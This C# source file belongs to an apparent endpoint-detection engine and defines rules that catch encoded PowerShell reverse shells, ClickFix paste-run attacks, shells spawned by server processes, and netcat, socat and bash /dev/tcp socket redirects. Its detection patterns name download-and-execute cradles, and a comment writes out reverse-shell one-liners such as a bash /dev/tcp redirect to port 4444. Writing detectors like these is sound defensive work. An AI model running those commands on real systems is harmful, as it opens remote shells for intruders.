using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Sentinel.Core
{
    [RuleCategory(DetectionCategory.ReverseShell)]
    public class ReverseShellRule : IDetectionRule
    {
        public string Name => "ReverseShellRule";

        // Routine automation flags do not prove evasion or a reverse shell.
        private static readonly System.Text.RegularExpressions.Regex EncodedArgument = new(
            @"(?:^|\s)-(?:enc|encodedcommand)\s+[""']?([A-Za-z0-9+/=]+)",
            System.Text.RegularExpressions.RegexOptions.IgnoreCase | System.Text.RegularExpressions.RegexOptions.CultureInvariant);

        internal static bool ContainsReverseShell(string command)
        {
            if (command.Length > 65536) return false;
            var match = EncodedArgument.Match(command);
            if (!match.Success) return false;
            try
            {
                var script = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(match.Groups[1].Value));
                // Require a socket stream, input/output and command execution together.
                return script.IndexOf("tcpclient", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    script.IndexOf("getstream", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    System.Text.RegularExpressions.Regex.IsMatch(script, @"\.Read\s*\(", System.Text.RegularExpressions.RegexOptions.IgnoreCase) &&
                    System.Text.RegularExpressions.Regex.IsMatch(script, @"\.Write\s*\(", System.Text.RegularExpressions.RegexOptions.IgnoreCase) &&
                    System.Text.RegularExpressions.Regex.IsMatch(script, @"\b(?:iex|invoke-expression)\b", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
            }
            catch (FormatException) { return false; }
        }

        public DetectionEvent? Evaluate(FusedTelemetryContext context)
        {
            if (context.TriggeringEvent is ProcessTelemetry pt)
            {
                var originalCommand = pt.CommandLine ?? "";
                var cmd = originalCommand.ToLowerInvariant();
                if (pt.ProcessName.Contains("powershell") && 
                    (cmd.Contains("-enc") || 
                     cmd.Contains("-encodedcommand")))
                {
                    // Check for escalation indicators that suggest malicious use
                    bool hasEscalationIndicator = ContainsReverseShell(originalCommand);

                    if (hasEscalationIndicator)
                    {
                        // Combined with evasion flags or network indicators -> Tier1 + Kill
                        return new DetectionEvent
                        {
                            RuleName = Name,
                            ProcessName = pt.ProcessName,
                            ProcessId = pt.ProcessId,
                            SignalType = SignalType.ReverseShell,
                            Family = TerminalFamily.ReverseShell,
                            Confidence = 0.85,
                            Tier = DetectionTier.Tier1Behavioral,
                            AuthorizedResponse = ResponseAction.KillProcessTree,
                            Evidence = $"Encoded PowerShell with socket command-execution loop: {originalCommand}",
                            Reasoning = "Decoded PowerShell combines a TCP stream, stream reads and writes, and command execution, consistent with a reverse-shell command loop."
                        };
                    }
                    else
                    {
                        // Encoded command alone -> Tier2 (log only, no kill)
                        return new DetectionEvent
                        {
                            RuleName = Name,
                            ProcessName = pt.ProcessName,
                            ProcessId = pt.ProcessId,
                            SignalType = SignalType.ReverseShell,
                            Confidence = 0.50,
                            Tier = DetectionTier.Tier2Indicator,
                            AuthorizedResponse = ResponseAction.LogOnly,
                            Evidence = $"Encoded PowerShell execution (reverse shell unproven): {originalCommand}",
                            Reasoning = "Process launched PowerShell with an encoded command. Routine execution flags do not prove malicious behavior; this may be legitimate automation. Logged for correlation."
                        };
                    }
                }
            }
            return null;
        }
    }


    [RuleCategory(DetectionCategory.ReverseShell)]
    public class ClickFixDetectionRule : IDetectionRule
    {
        public string Name => "ClickFixDetectionRule";

        public DetectionEvent? Evaluate(FusedTelemetryContext context)
        {
            if (context.TriggeringEvent is not ProcessTelemetry pt)
                return null;

            var cmd = pt.CommandLine?.ToLowerInvariant() ?? "";
            var parent = pt.ParentProcessName?.ToLowerInvariant() ?? "";
            var name = pt.ProcessName ?? "";

            // Win+R / browser-driven spawn, or shell-out from conhost (Run dialog intermediate)
            bool isExplorerOrBrowserParent =
                parent is "explorer" or "explorer.exe" or
                    "chrome" or "chrome.exe" or
                    "msedge" or "msedge.exe" or
                    "firefox" or "firefox.exe" or
                    "brave" or "brave.exe" or
                    "opera" or "opera.exe" or
                    "vivaldi" or "vivaldi.exe" or
                    "conhost" or "conhost.exe" or
                    "runtimebroker" or "runtimebroker.exe";

            bool isSuspiciousShell =
                name.Contains("powershell") ||
                name.Contains("pwsh") ||
                name.Contains("cmd") ||
                name.Contains("mshta") ||
                name.Contains("wscript") ||
                name.Contains("cscript") ||
                name.Contains("msdt") ||
                name.Contains("forfiles");

            if (!isExplorerOrBrowserParent || !isSuspiciousShell)
                return null;

            // v1.6.1: Expanded payload signatures from 2025-26 ClickFix campaigns
            bool isClickFixPayload =
                cmd.Contains("frombase64string") ||
                cmd.Contains("downloadstring") ||
                cmd.Contains("downloadfile") ||
                cmd.Contains("downloaddata") ||
                cmd.Contains("iex ") ||
                cmd.Contains("|iex") ||
                cmd.Contains("iex(") ||
                cmd.Contains("invoke-expression") ||
                cmd.Contains("invoke-webrequest") ||
                cmd.Contains("invoke-restmethod") ||
                cmd.Contains(" iwr ") ||
                cmd.Contains(" irm ") ||
                cmd.Contains("| iwr") ||
                cmd.Contains("| irm") ||
                cmd.Contains("certutil -urlcache") ||
                cmd.Contains("certutil.exe -urlcache") ||
                cmd.Contains("bitsadmin") ||
                cmd.Contains("start-bitstransfer") ||
                cmd.Contains("curl ") && (cmd.Contains("http") || cmd.Contains("|")) ||
                cmd.Contains("wget ") && cmd.Contains("http") ||
                cmd.Contains("-enc ") ||
                cmd.Contains("-encodedcommand") ||
                cmd.Contains("-e ") && cmd.Contains("powershell") ||
                cmd.Contains("-w h") || cmd.Contains("-w hidden") || cmd.Contains("windowstyle hidden") ||
                cmd.Contains("-nop") && (cmd.Contains("http") || cmd.Contains("iex") || cmd.Contains("irm")) ||
                cmd.Contains("mshta") && cmd.Contains("http") ||
                (cmd.Contains("http") && name.Contains("mshta")) ||
                cmd.Contains("javascript:") ||
                cmd.Contains("vbscript:") ||
                // Fake CAPTCHA clipboard often starts with verification noise then command
                cmd.Contains("verification") && (cmd.Contains("powershell") || cmd.Contains("http")) ||
                cmd.Contains("captcha") && cmd.Contains("http");

            if (!isClickFixPayload)
                return null;

            return new DetectionEvent
            {
                RuleName = Name,
                ProcessName = pt.ProcessName ?? "",
                ProcessId = pt.ProcessId,
                SignalType = SignalType.ReverseShell,
                Family = TerminalFamily.ReverseShell,
                Confidence = 0.96,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.KillProcessTree,
                Evidence = $"ClickFix / FakeCAPTCHA paste-run detected (parent={pt.ParentProcessName}): {pt.CommandLine}",
                Reasoning =
                    "Shell spawned from explorer/browser (Win+R or paste-run) with download/encode/hidden-window " +
                    "patterns matching ClickFix and FakeCAPTCHA campaigns (Microsoft 2025, ESET +500% H1 2025). " +
                    "Victims are socially engineered to paste attacker-controlled PowerShell/cmd themselves."
            };
        }
    }

    /// <summary>
    /// v1.6.1: Detects compromised npm/node lifecycle scripts that shell out to downloaders.
    /// Inspired by 2025 supply-chain waves (Shai-Hulud / Tinycolor / Crowdstrike npm packages on HN).
    /// </summary>

    /// <summary>
    /// Detects a shell spawned directly by a network-facing server process (web server, mail daemon,
    /// database, application framework, etc.).  This is the most reliable signal for a classic
    /// exploit-driven reverse shell: attacker sends payload → server process forks cmd.exe / bash.
    ///
    /// The existing ClickFixDetectionRule already covers browser/explorer parents (ClickFix social
    /// engineering).  This rule closes the gap for the infrastructure side: a compromised service
    /// process (e.g. IIS, Apache, Tomcat, Node, MSSQL, Jenkins) spawning a shell.
    ///
    /// Tier1 / KillProcessTree — single-signal kill is authorized via IsAttackClassTerminal
    /// ("Reverse Shell: Network-Facing Parent Spawned Shell").
    /// </summary>
    [RuleCategory(DetectionCategory.ReverseShell)]
    public class NetworkFacingParentShellRule : IDetectionRule
    {
        public string Name => "NetworkFacingParentShellRule";

        // Processes that legitimately listen on network ports and should NEVER spawn interactive
        // shells in normal operation.  A shell child here almost always means exploitation.
        private static readonly HashSet<string> NetworkFacingParents = new(StringComparer.OrdinalIgnoreCase)
        {
            // Web servers
            "w3wp",        // IIS worker process
            "w3wp.exe",
            "httpd",       // Apache
            "httpd.exe",
            "nginx",
            "nginx.exe",
            "apache",
            "apache.exe",
            "apache2",
            // Java application servers (Tomcat, JBoss, WebLogic, etc.)
            "java",
            "java.exe",
            "javaw",
            "javaw.exe",
            // Node / Deno / Bun web servers
            "node",
            "node.exe",
            "deno",
            "deno.exe",
            "bun",
            "bun.exe",
            // PHP
            "php",
            "php.exe",
            "php-cgi",
            "php-cgi.exe",
            // Python WSGI / FastAPI / Django
            "python",
            "python.exe",
            "python3",
            "python3.exe",
            "gunicorn",
            "uvicorn",
            // Ruby (Rails, Sinatra)
            "ruby",
            "ruby.exe",
            // Database engines
            "sqlservr",    // MSSQL
            "sqlservr.exe",
            "mysqld",
            "mysqld.exe",
            "postgres",
            "postgres.exe",
            "mongod",
            "mongod.exe",
            // CI/CD and build servers
            "jenkins",
            "jenkins.exe",
            // Redis / Memcached
            "redis-server",
            "memcached",
            // Mail / DNS daemons
            "smtpd",
            "named",
            "dovecot",
        };

        // The spawned child must be a shell/LOLBin to count
        private static readonly HashSet<string> ShellChildren = new(StringComparer.OrdinalIgnoreCase)
        {
            "cmd",     "cmd.exe",
            "powershell", "powershell.exe",
            "pwsh",    "pwsh.exe",
            "bash",    "bash.exe",
            "sh",      "sh.exe",
            "zsh",     "zsh.exe",
            "mshta",   "mshta.exe",
            "wscript", "wscript.exe",
            "cscript", "cscript.exe",
            "rundll32","rundll32.exe",
            "regsvr32","regsvr32.exe",
            "certutil","certutil.exe",
            "bitsadmin","bitsadmin.exe",
            "forfiles","forfiles.exe",
        };

        public DetectionEvent? Evaluate(FusedTelemetryContext context)
        {
            if (context.TriggeringEvent is not ProcessTelemetry pt)
                return null;

            var parentRaw = pt.ParentProcessName ?? "";
            // Normalize: strip path prefix so "C:\Windows\System32\cmd.exe" → "cmd.exe"
            var parent = Path.GetFileName(parentRaw).ToLowerInvariant();
            if (string.IsNullOrEmpty(parent))
                parent = parentRaw.ToLowerInvariant();

            if (!NetworkFacingParents.Contains(parent) && !NetworkFacingParents.Contains(parentRaw))
                return null;

            var childRaw = pt.ProcessName ?? "";
            var child = Path.GetFileName(childRaw);
            if (string.IsNullOrEmpty(child))
                child = childRaw;

            if (!ShellChildren.Contains(child))
                return null;

            // Additional credibility boost: if the command line has network/download/encode markers,
            // bump confidence; otherwise stay at high-but-not-maximum to allow for fringe legitimate
            // setups (e.g. a developer running `w3wp` locally while also opening a terminal).
            var cmd = (pt.CommandLine ?? "").ToLowerInvariant();
            bool hasPayloadMarker =
                cmd.Contains("-enc") || cmd.Contains("-encodedcommand") ||
                cmd.Contains("iex") || cmd.Contains("invoke-expression") ||
                cmd.Contains("downloadstring") || cmd.Contains("invoke-webrequest") ||
                cmd.Contains("frombase64string") ||
                cmd.Contains("http://") || cmd.Contains("https://") ||
                cmd.Contains("certutil") || cmd.Contains("bitsadmin") ||
                cmd.Contains("-w hidden") || cmd.Contains("windowstyle hidden");

            double confidence = hasPayloadMarker ? 0.95 : 0.82;

            return new DetectionEvent
            {
                RuleName = "Reverse Shell: Network-Facing Parent Spawned Shell",
                ProcessName = pt.ProcessName ?? "",
                ProcessId = pt.ProcessId,
                SignalType = SignalType.ReverseShell,
                Family = TerminalFamily.ReverseShell,
                Confidence = confidence,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.KillProcessTree,
                Evidence = $"Network-facing process '{pt.ParentProcessName}' spawned shell '{pt.ProcessName}' " +
                           $"(PID {pt.ProcessId})" +
                           (hasPayloadMarker ? $" with payload marker in cmdline: {pt.CommandLine}" : ""),
                Reasoning =
                    $"A network-facing server process ({pt.ParentProcessName}) spawned an interactive shell " +
                    $"({pt.ProcessName}). In normal operation these processes never spawn shells. This is the " +
                    "textbook pattern for exploit-driven command execution: the attacker sends a payload through " +
                    "the exposed service and the server process forks a shell to carry out commands. " +
                    (hasPayloadMarker
                        ? "Download/encode/hidden-window markers in the command line further confirm this is not incidental."
                        : "No explicit payload markers in cmdline - kill is still warranted; legitimate server spawns of shell binaries are essentially non-existent.")
            };
        }
    }

    /// <summary>
    /// Detects raw socket I/O redirection patterns used to establish reverse shells without a
    /// dedicated C2 framework:
    ///
    ///   1. Bash TCP redirect:    bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1
    ///   2. CMD with piped ncat:  cmd.exe /c ncat.exe -e cmd.exe ...
    ///   3. Netcat -e flag:       nc.exe -e cmd.exe ... / ncat -e powershell ...
    ///   4. PowerShell TCPClient: [System.Net.Sockets.TcpClient] ... StreamReader/StreamWriter
    ///   5. Socat exec:           socat exec:'bash -li' tcp-connect:...
    ///
    /// These bypass every C2-framework-specific named pipe and port signature. The signal type
    /// is ReverseShell, Tier1 / KillProcessTree.
    /// </summary>
    [RuleCategory(DetectionCategory.ReverseShell)]
    public class RawSocketRedirectRule : IDetectionRule
    {
        public string Name => "RawSocketRedirectRule";

        public DetectionEvent? Evaluate(FusedTelemetryContext context)
        {
            if (context.TriggeringEvent is not ProcessTelemetry pt)
                return null;

            var cmd = (pt.CommandLine ?? "").ToLowerInvariant();
            var name = (pt.ProcessName ?? "").ToLowerInvariant();
            var namePlain = Path.GetFileNameWithoutExtension(name);

            string? matchReason = null;

            // 1. Bash /dev/tcp or /dev/udp redirect
            if (cmd.Contains("/dev/tcp/") || cmd.Contains("/dev/udp/"))
            {
                // Legitimate uses are extremely rare on Windows (WSL maybe), but on a Windows
                // host this pattern in a command line is essentially always a reverse shell cradle.
                matchReason = "Bash /dev/tcp or /dev/udp socket redirect detected in command line";
            }

            // 2. Netcat / ncat -e (exec flag) — pipes stdin/stdout of a program over the socket
            if (matchReason == null &&
                (namePlain is "nc" or "ncat" or "netcat" or "ncat64" or "nc64" ||
                 cmd.Contains("ncat ") || cmd.Contains(" nc ") || cmd.Contains("netcat ")))
            {
                // -e <program> or --exec <program> routes the program's I/O over TCP
                if (cmd.Contains(" -e ") || cmd.Contains(" --exec ") ||
                    cmd.Contains(" -e\"") || cmd.Contains("-exec "))
                {
                    matchReason = "Netcat/ncat -e (exec) flag: stdin/stdout of a process piped over TCP socket";
                }
                // -c <shell command> is equivalent on some ncat builds
                else if (cmd.Contains(" -c ") && (cmd.Contains("cmd") || cmd.Contains("bash") || cmd.Contains("powershell")))
                {
                    matchReason = "Netcat/ncat -c with shell: command string piped over TCP socket";
                }
            }

            // 3. Socat exec / system shell over TCP
            if (matchReason == null &&
                (namePlain is "socat" || cmd.Contains("socat ")))
            {
                if ((cmd.Contains("exec:") || cmd.Contains("system:")) &&
                    (cmd.Contains("tcp") || cmd.Contains("openssl")))
                {
                    matchReason = "Socat exec/system with TCP: process I/O tunnelled over socket";
                }
            }

            // 4. PowerShell raw TcpClient reverse shell cradle
            // Pattern: New-Object Net.Sockets.TcpClient(...) or [System.Net.Sockets.TcpClient]
            // combined with StreamReader/Writer and Invoke/GetStream plumbing
            if (matchReason == null && (name.Contains("powershell") || name.Contains("pwsh")))
            {
                bool hasTcpClient =
                    cmd.Contains("tcpclient") ||
                    cmd.Contains("net.sockets") ||
                    cmd.Contains("system.net.sockets");
                bool hasStreamPlumbing =
                    cmd.Contains("streamreader") ||
                    cmd.Contains("streamwriter") ||
                    cmd.Contains("getstream") ||
                    cmd.Contains("networkstream");
                bool hasExec =
                    cmd.Contains("invoke-expression") || cmd.Contains("iex") ||
                    cmd.Contains("cmd.exe") || cmd.Contains("/bin/sh") ||
                    cmd.Contains("bash") || cmd.Contains("powershell");

                if (hasTcpClient && (hasStreamPlumbing || hasExec))
                {
                    matchReason = "PowerShell raw TcpClient reverse shell cradle (socket + stream plumbing)";
                }
            }

            // 5. cmd.exe with piped redirects to/from a named handle that looks like a socket
            // Covers: cmd /c "ncat -lp 4444 -e cmd.exe" or indirect pipe chains
            if (matchReason == null &&
                (namePlain is "cmd" || name.Contains("cmd")))
            {
                // cmd spawning ncat/netcat/socat with -e is already covered above but may appear
                // here when cmd is the immediate process rather than ncat.
                if ((cmd.Contains("ncat") || cmd.Contains("netcat") || cmd.Contains("socat")) &&
                    (cmd.Contains(" -e ") || cmd.Contains("exec:") || cmd.Contains("--exec")))
                {
                    matchReason = "cmd.exe orchestrating ncat/socat exec — shell I/O over socket";
                }
            }

            if (matchReason == null)
                return null;

            return new DetectionEvent
            {
                RuleName = "Reverse Shell: Raw Socket I/O Redirect",
                ProcessName = pt.ProcessName ?? "",
                ProcessId = pt.ProcessId,
                SignalType = SignalType.ReverseShell,
                Family = TerminalFamily.ReverseShell,
                Confidence = 0.90,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.KillProcessTree,
                Evidence = $"{matchReason}. Process='{pt.ProcessName}' PID={pt.ProcessId} Cmdline='{pt.CommandLine}'",
                Reasoning =
                    "Raw socket I/O redirection bypasses framework-specific named pipe and port heuristics. " +
                    "The detected pattern directly routes a shell's stdin/stdout over a TCP connection, " +
                    "which is the mechanism used by Bash /dev/tcp redirects, Netcat -e, Socat exec, and " +
                    "PowerShell TcpClient cradles — all textbook frameworkless reverse shells."
            };
        }
    }
}
